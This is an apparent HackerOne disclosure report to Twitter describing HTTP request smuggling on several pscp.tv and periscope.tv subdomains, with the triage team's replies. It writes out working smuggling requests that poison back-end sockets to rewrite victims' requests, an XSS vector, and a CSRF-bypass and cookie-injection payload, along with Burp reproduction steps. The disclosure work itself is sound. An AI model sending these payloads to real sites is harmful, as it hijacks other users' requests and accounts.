title: http request smuggling in pscp.tv and periscope.tv

profile.name: Twitter
profile.about: Twitter helps you create and share ideas and information instantly, without barriers.

vulnerability_information:
**Description:** 
the Description of HTTP request smuggling attacks : [here](https://portswigger.net/web-security/request-smuggling)

seems that many subdomains in pscp.tv and periscope.tv vulenrable

##1-Detect HTTP request smuggling attack [504 response with delay (30 s, 60s)] "DoS"

POC & Steps To Reproduce: in this video F606648
Resource: [https://portswigger.net/web-security/request-smuggling/finding] 


##2- [exploit HTTP request smuggling attack ] send two request as one request get two response as one response [low impact]
POC & Steps To Reproduce & impact : in this video F606663
**ps:**
-add the two CRLFs in the end of the second request in GET REQUEST.
-use the valid value of content-length in POST REQUEST.

##3-[exploit HTTP request smuggling attack ]  poison the VICTIM request

POC & Steps To Reproduce & impact : in this video
inject a get request to the victim request F606689 
inject a get request to the victim request F606704 
**ps:**
-don't add the two CRLFs in the end of the second request in GET REQUEST.
-use large value in content-length then the length of request body in POST REQUEST.
Resource:
[exploit] (https://portswigger.net/web-security/request-smuggling/exploiting)

## important:
on a live site with a high volume of traffic like [www.pscp.tv] .it can be hard to prove request smuggling exists without exploiting numerous genuine users in the process.
-in the poc F606704  , i edit the victim request  to my post request `editing the description of my account` and ignore the real victim request. and the description  will change.

## Impact

1-dos
2-bypass csrf token & inject cookie  allow to link attacker account with [google,twitter] victim account
  report : https://hackerone.com/reports/704489
see other impact in 
https://portswigger.net/web-security/request-smuggling/exploiting
vulnerability_information_html:
Description:
the Description of HTTP request smuggling attacks : here

seems that many subdomains in pscp.tv and periscope.tv vulenrable

1-Detect HTTP request smuggling attack [504 response with delay (30 s, 60s)] "DoS"

POC & Steps To Reproduce: in this video HTTPsmugReq_dos.mp4 (F606648)
Resource: [https://portswigger.net/web-security/request-smuggling/finding]

2- [exploit HTTP request smuggling attack ] send two request as one request get two response as one response [low impact]

POC & Steps To Reproduce & impact : in this video http_smug_2_requ_2resp_.mp4 (F606663)
ps:
-add the two CRLFs in the end of the second request in GET REQUEST.
-use the valid value of content-length in POST REQUEST.

3-[exploit HTTP request smuggling attack ] poison the VICTIM request

POC & Steps To Reproduce & impact : in this video
inject a get request to the victim request http_smug_get_request_.mp4 (F606689)
inject a get request to the victim request http_smug_post_request_.mp4 (F606704)
ps:
-don't add the two CRLFs in the end of the second request in GET REQUEST.
-use large value in content-length then the length of request body in POST REQUEST.
Resource:
exploit

important:

on a live site with a high volume of traffic like [www.pscp.tv] .it can be hard to prove request smuggling exists without exploiting numerous genuine users in the process.
-in the poc http_smug_post_request_.mp4 (F606704) , i edit the victim request to my post request editing the description of my account and ignore the real victim request. and the description will change.

Impact

1-dos
2-bypass csrf token & inject cookie allow to link attacker account with [google,twitter] victim account
report : https://hackerone.com/reports/704489
see other impact in
https://portswigger.net/web-security/request-smuggling/exploiting

activities.message:
Thank you for your report @protostar0,

We reviewed the video you provided, and it does seem like you discovered an interesting behavior on our platform. However, we had some trouble reproducing the behavior you described. Can you provide us some plaintext examples of the requests you used in your videos? 
( F606704 F606689 F606663 )

In addition, you state, "seems that many subdomains in pscp.tv and periscope.tv vulnerable"
Can you identify any other subdomains which are impacted by this behavior? 

Thank you for thinking of Twitter security.
activities.markdown_message:
Thank you for your report @protostar0,

We reviewed the video you provided, and it does seem like you discovered an interesting behavior on our platform. However, we had some trouble reproducing the behavior you described. Can you provide us some plaintext examples of the requests you used in your videos?
( http_smug_post_request_.mp4 (F606704) http_smug_get_request_.mp4 (F606689) http_smug_2_requ_2resp_.mp4 (F606663) )

In addition, you state, "seems that many subdomains in pscp.tv and periscope.tv vulnerable"
Can you identify any other subdomains which are impacted by this behavior?

Thank you for thinking of Twitter security.

activities.message:
hi team;
i create new video to Reproduce:
##2- [exploit HTTP request smuggling attack ] send two request as one request get two response as one response:
Steps To Reproduce : F608621
**payload:**
>Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
>
>0
>
>GET /i/google/login?csrf=no-csrf&origin=<svg/onload%3dalert(1)> HTTP/1.1
>Cookie: pscp-csrf=no-csrf
>Host: www.pscp.tv

**ps :**
 i use chrome browser,with burp

1- choose any valid request from pscp.tv and send it to repeater
2- delete this header (Connection: close  ,Accept-Encoding: gzip, deflate)
3- add this header <Transfer-Encoding: chunked>
if its GET request should add <Content-Type: application/x-www-form-urlencoded>

4- add chunked encode [ put just 0 with two CRLFs]
5-put the second request  and add >
"if its a GET request [ the second request] > end it with two CRLFs [valid request]
"if  its POST request > put a valid value in content length of second request"

repeat this steps in other subdomains in pscp.tv periscope.tv 

Vulnerable subdomains:
--------------------------
www.pscp.tv 
www.periscope.tv 
assets.pscp.tv
channels.pscp.tv
channels.periscope.tv
proxsee.pscp.tv
proxsee.periscope.tv
canary-web.periscope.tv
canary-web.pscp.tv
.
**ps:**
i get other domain vulnerable  in mopub.com. with the same vulnerability
should create new report?!!

activities.message:
after prove the exist  HTTP Request Smuggling  ;
now real impact its poising the sockets of back-end and change the request of victims
##[exploit HTTP request smuggling attack ] poison the VICTIM request:
explanation:
--------------
1-attacker send request with payload 
**attacker request **
>GET / HTTP/1.1		
Host: www.pscp.tv
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
>Content-Length: 100
>
>0												
>
>GET /404 HTTP/1.1                        # payload
>Ignore-Requst-victim: req=				 # without two crlf


2- the back-end receive this request as two request , the first request is a valid request will send the response 
3-when back-end server will receive the second request [ payload] , cause the second request doesn't have [two crlf] in the end , the back end wait the next header .This leaves the back-end socket poisoned with the payload

4- the front-end server send the next request [ victim request ] to back-end server ,
**Victim request**
>GET / HTTP/1.1
Host: www.pscp.tv
[two CRLF]



5- the back-end server treat the Victim request as the next header , and receive the [2 crlf] from the victim request.  
**Victim request after poison :**
>GET /404 HTTP/1.1
Ignore-Requst-victim: req=GET / HTTP/1.1
Host: www.pscp.tv
[two CRLF]

6- the the victim receive `404 not found page`
ps:
---  
editing payload to 
>GET /i/google/login?csrf=no-csrf&origin=anyvalue;,newcookie=newvalue; HTTP/1.1
Cookie: pscp-csrf=no-csrf
X-INgor-Victim-request: i=

will bypass csrf and injected cookie , see my report https://hackerone.com/reports/704489

##important:
1- on a live site with a high volume of traffic like [www.pscp.tv] .it can be hard to prove the poising of victim with request smuggling  without exploiting numerous genuine users in the process.
2- you can poising the socket of back-end  server with 2 way :
 a. the payload [second request] is a GET request:   send payload without [two CRLFs] .
 b.  the payload is POST request: put a large value in `Content-Length` in a payload . see POC F608815


 create this POC : without exploiting many users : F608815
---------------------------------
**explanation of poc:**

- in this poc i will poising the back-end server with a VALID POST  REQUEST [payload] with large value of  `Content-Length`.the rest of body will be the `victim Request `
- the payload is editing    my **PROFILE DESCRIPTION** and ignore the request of the victim 
means that the request of the victim after poising will be my REQUEST OF EDITING DESCRIPTION of my profile 
- and will don't get response of second REQUEST [cause injected to victim] and the
 **DESCRIPTION OF MY PROFILE WILL CHANGE WITH SAME VALUE IN THE PAYLOAD**
activities.markdown_message:
after prove the exist HTTP Request Smuggling ;
now real impact its poising the sockets of back-end and change the request of victims

[exploit HTTP request smuggling attack ] poison the VICTIM request:

explanation:

1-attacker send request with payload
*attacker request *

GET / HTTP/1.1

Host: www.pscp.tv
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 100

0

GET /404 HTTP/1.1 # payload
Ignore-Requst-victim: req= # without two crlf

2- the back-end receive this request as two request , the first request is a valid request will send the response
3-when back-end server will receive the second request [ payload] , cause the second request doesn't have [two crlf] in the end , the back end wait the next header .This leaves the back-end socket poisoned with the payload

4- the front-end server send the next request [ victim request ] to back-end server ,
Victim request

GET / HTTP/1.1
Host: www.pscp.tv
[two CRLF]

5- the back-end server treat the Victim request as the next header , and receive the [2 crlf] from the victim request.

Victim request after poison :

GET /404 HTTP/1.1
Ignore-Requst-victim: req=GET / HTTP/1.1
Host: www.pscp.tv
[two CRLF]

6- the the victim receive 404 not found page

ps:

editing payload to

GET /i/google/login?csrf=no-csrf&origin=anyvalue;,newcookie=newvalue; HTTP/1.1
Cookie: pscp-csrf=no-csrf
X-INgor-Victim-request: i=

will bypass csrf and injected cookie , see my report https://hackerone.com/reports/704489

important:

1- on a live site with a high volume of traffic like [www.pscp.tv] .it can be hard to prove the poising of victim with request smuggling without exploiting numerous genuine users in the process.
2- you can poising the socket of back-end server with 2 way :
a. the payload [second request] is a GET request: send payload without [two CRLFs] .
b. the payload is POST request: put a large value in Content-Length in a payload . see POC FINAL-POC.mp4 (F608815)

create this POC : without exploiting many users : FINAL-POC.mp4 (F608815)

explanation of poc:

  • in this poc i will poising the back-end server with a VALID POST REQUEST [payload] with large value of Content-Length.the rest of body will be the victim Request
  • the payload is editing my PROFILE DESCRIPTION and ignore the request of the victim means that the request of the victim after poising will be my REQUEST OF EDITING DESCRIPTION of my profile
  • and will don't get response of second REQUEST [cause injected to victim] and the DESCRIPTION OF MY PROFILE WILL CHANGE WITH SAME VALUE IN THE PAYLOAD

Thank you for thinking of Twitter security.

activities.message:
Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.

Thank you for helping keep Twitter secure!
